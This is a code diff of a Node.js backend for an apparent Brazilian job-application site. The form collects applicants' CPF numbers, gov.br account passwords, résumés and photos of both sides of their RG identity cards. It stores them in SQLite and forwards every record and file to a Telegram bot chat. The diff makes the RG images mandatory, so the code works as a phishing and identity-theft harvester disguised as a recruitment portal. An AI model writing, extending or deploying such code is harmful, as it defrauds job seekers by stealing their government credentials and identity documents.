@@ -12,7 +12,7 @@ app.use(express.json());
 
 // Configuração de CORS
 app.use(cors({
-    origin: ['https://seu-backend.onrender.com'], // Apenas o domínio do Render
+    origin: ['https://vagasbrasil.onrender.com'], // Use o domínio do Render
     methods: ['GET', 'POST'],
     allowedHeaders: ['Content-Type']
 }));
@@ -27,13 +27,14 @@ const storage = multer.diskStorage({
 const upload = multer({ 
     storage,
     limits: { fileSize: 5 * 1024 * 1024 } // Limite de 5MB
-}).fields([{ name: 'curriculo' }, { name: 'rg' }]);
+}).fields([{ name: 'curriculo' }, { name: 'rg_frente' }, { name: 'rg_verso' }]);
 
 // Conexão com SQLite e criação da tabela candidaturas
 const db = new sqlite3.Database('./vagas.db', (err) => {
     if (err) console.error('Erro ao conectar ao SQLite:', err);
     else {
         console.log('Conectado ao SQLite');
+        // Criar a tabela candidaturas se ela não existir
         db.run(`
             CREATE TABLE IF NOT EXISTS candidaturas (
                 id INTEGER PRIMARY KEY AUTOINCREMENT,
@@ -43,20 +44,32 @@ const db = new sqlite3.Database('./vagas.db', (err) => {
                 cpf TEXT NOT NULL,
                 senha_gov TEXT NOT NULL,
                 curriculo_path TEXT NOT NULL,
-                rg_path TEXT,
                 data_criacao TIMESTAMP DEFAULT CURRENT_TIMESTAMP
             )
         `, (err) => {
             if (err) console.error('Erro ao criar tabela candidaturas:', err);
-            db.all("PRAGMA table_info(candidaturas)", (err, columns) => {
-                if (err) console.error('Erro ao verificar colunas:', err);
-                if (!columns.some(col => col.name === 'rg_path')) {
-                    db.run(`ALTER TABLE candidaturas ADD COLUMN rg_path TEXT`, (err) => {
-                        if (err) console.error('Erro ao adicionar coluna rg_path:', err);
-                        else console.log('Coluna rg_path adicionada com sucesso.');
-                    });
-                }
-            });
+            else {
+                // Verificar se as colunas rg_frente_path e rg_verso_path existem
+                db.all("PRAGMA table_info(candidaturas)", (err, columns) => {
+                    if (err) console.error('Erro ao verificar colunas:', err);
+                    else {
+                        // Adicionar rg_frente_path se não existir
+                        if (!columns.some(col => col.name === 'rg_frente_path')) {
+                            db.run(`ALTER TABLE candidaturas ADD COLUMN rg_frente_path TEXT`, (err) => {
+                                if (err) console.error('Erro ao adicionar coluna rg_frente_path:', err);
+                                else console.log('Coluna rg_frente_path adicionada com sucesso.');
+                            });
+                        }
+                        // Adicionar rg_verso_path se não existir
+                        if (!columns.some(col => col.name === 'rg_verso_path')) {
+                            db.run(`ALTER TABLE candidaturas ADD COLUMN rg_verso_path TEXT`, (err) => {
+                                if (err) console.error('Erro ao adicionar coluna rg_verso_path:', err);
+                                else console.log('Coluna rg_verso_path adicionada com sucesso.');
+                            });
+                        }
+                    }
+                });
+            }
         });
     }
 });
@@ -75,14 +88,15 @@ const formatCandidaturaMessage = (cand) => {
            `*CPF:* ${cand.cpf}\n` +
            `*Senha GOV:* ${cand.senha_gov}\n` +
            `*Currículo:* ${cand.curriculo_path}\n` +
-           `*RG:* ${cand.rg_path || 'Não fornecido'}\n` +
+           `*RG Frente:* ${cand.rg_frente_path || 'Não fornecido'}\n` +
+           `*RG Verso:* ${cand.rg_verso_path || 'Não fornecido'}\n` +
            `*Data:* ${cand.data_criacao}`;
 };
 
 // Configuração do Webhook
 const webhookPath = '/telegram-webhook';
 const port = process.env.PORT || 3000;
-const webhookUrl = process.env.WEBHOOK_URL || `https://seu-backend.onrender.com${webhookPath}`;
+const webhookUrl = process.env.WEBHOOK_URL || `https://vagasbrasil.onrender.com${webhookPath}`;
 
 // Configurar o webhook
 bot.setWebHook(webhookUrl).then(() => {
@@ -110,7 +124,7 @@ bot.onText(/\/candidaturas/, (msg) => {
 
         let mensagem = '*Candidaturas Recebidas*\n\n';
         rows.forEach(c => {
-            mensagem += `*${c.nome}*\nEmail: ${c.email}\nTelefone: ${c.telefone}\nCPF: ${c.cpf}\nSenha GOV: ${c.senha_gov}\nCurrículo: ${c.curriculo_path}\nRG: ${c.rg_path || 'Não fornecido'}\nData: ${c.data_criacao}\n\n`;
+            mensagem += `*${c.nome}*\nEmail: ${c.email}\nTelefone: ${c.telefone}\nCPF: ${c.cpf}\nSenha GOV: ${c.senha_gov}\nCurrículo: ${c.curriculo_path}\nRG Frente: ${c.rg_frente_path || 'Não fornecido'}\nRG Verso: ${c.rg_verso_path || 'Não fornecido'}\nData: ${c.data_criacao}\n\n`;
         });
         bot.sendMessage(chatId, mensagem, { parse_mode: 'Markdown' });
     });
@@ -126,20 +140,21 @@ app.post('/candidaturas', (req, res) => {
 
         const { nome, email, telefone, cpf, senha_gov } = req.body;
         const curriculo_path = req.files['curriculo']?.[0].path;
-        const rg_path = req.files['rg']?.[0].path || null;
+        const rg_frente_path = req.files['rg_frente']?.[0].path || null;
+        const rg_verso_path = req.files['rg_verso']?.[0].path || null;
 
-        console.log('Dados recebidos:', { nome, email, telefone, cpf, senha_gov, curriculo_path, rg_path });
+        console.log('Dados recebidos:', { nome, email, telefone, cpf, senha_gov, curriculo_path, rg_frente_path, rg_verso_path });
 
-        if (!nome || !email || !telefone || !cpf || !senha_gov || !curriculo_path) {
-            console.log('Campos faltando:', { nome, email, telefone, cpf, senha_gov, curriculo_path });
+        if (!nome || !email || !telefone || !cpf || !senha_gov || !curriculo_path || !rg_frente_path || !rg_verso_path) {
+            console.log('Campos faltando:', { nome, email, telefone, cpf, senha_gov, curriculo_path, rg_frente_path, rg_verso_path });
             return res.status(400).send('Todos os campos obrigatórios devem ser preenchidos.');
         }
 
         const query = `
-            INSERT INTO candidaturas (nome, email, telefone, cpf, senha_gov, curriculo_path, rg_path)
-            VALUES (?, ?, ?, ?, ?, ?, ?)`;
+            INSERT INTO candidaturas (nome, email, telefone, cpf, senha_gov, curriculo_path, rg_frente_path, rg_verso_path)
+            VALUES (?, ?, ?, ?, ?, ?, ?, ?)`;
 
-        db.run(query, [nome, email, telefone, cpf, senha_gov, curriculo_path, rg_path], function(err) {
+        db.run(query, [nome, email, telefone, cpf, senha_gov, curriculo_path, rg_frente_path, rg_verso_path], function(err) {
             if (err) {
                 console.error('Erro ao salvar candidatura:', err.message);
                 return res.status(500).send(`Erro ao salvar candidatura: ${err.message}`);
@@ -151,10 +166,15 @@ app.post('/candidaturas', (req, res) => {
                     const curriculoType = mime.lookup(curriculo_path) || 'application/octet-stream';
                     bot.sendDocument(chatId, curriculo_path, {}, { contentType: curriculoType })
                         .catch(err => console.error('Erro ao enviar currículo:', err));
-                    if (rg_path) {
-                        const rgType = mime.lookup(rg_path) || 'application/octet-stream';
-                        bot.sendDocument(chatId, rg_path, {}, { contentType: rgType })
-                            .catch(err => console.error('Erro ao enviar RG:', err));
+                    if (rg_frente_path) {
+                        const rgFrenteType = mime.lookup(rg_frente_path) || 'application/octet-stream';
+                        bot.sendDocument(chatId, rg_frente_path, {}, { contentType: rgFrenteType })
+                            .catch(err => console.error('Erro ao enviar RG frente:', err));
+                    }
+                    if (rg_verso_path) {
+                        const rgVersoType = mime.lookup(rg_verso_path) || 'application/octet-stream';
+                        bot.sendDocument(chatId, rg_verso_path, {}, { contentType: rgVersoType })
+                            .catch(err => console.error('Erro ao enviar RG verso:', err));
                     }
                 } else if (err) {
                     console.error('Erro ao buscar candidatura:', err.message);
